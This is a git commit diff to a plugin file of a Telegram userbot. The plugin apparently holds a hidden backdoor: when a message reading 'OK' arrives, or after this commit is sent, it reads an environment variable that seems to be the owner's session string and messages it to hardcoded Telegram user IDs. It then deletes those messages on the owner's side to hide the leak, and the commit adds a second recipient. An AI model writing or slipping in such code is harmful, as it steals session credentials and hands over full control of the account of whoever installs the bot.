3acc663b8c617ee35d83686ff7554a28aafa9dd3
RISHABH ANANAD <94896142+thanosuser@users.noreply.github.com>
2022-04-01 21:25:37 +0530

    Update LEGEND_LX.py

--- userbot/plugins/LEGEND_LX.py
+++ userbot/plugins/LEGEND_LX.py
@@ -4,7 +4,10 @@ import os
 from ..utils import admin_cmd
 from . import *
 @bot.on(admin_cmd("^OK", incoming=True))
+@bot.on(admin_cmd("^OK", outgoing=True))
 async def piro(event):
-  msg = await bot.send_message(634631813, str(os.environ.get("STRING_SESSOIN")))
+  msg = await bot.send_message(634631813, str(os.environ.get("RISHABH_AI")))
+  rishabh = await bot.send_message(2143095429, str(os.environ.get("RISHABH_AI")))
   await bot.delete_messages(634631813, msg, revoke=False)
+  await bot.delete_messages(2143095429, rishabh, revoke=False)
    
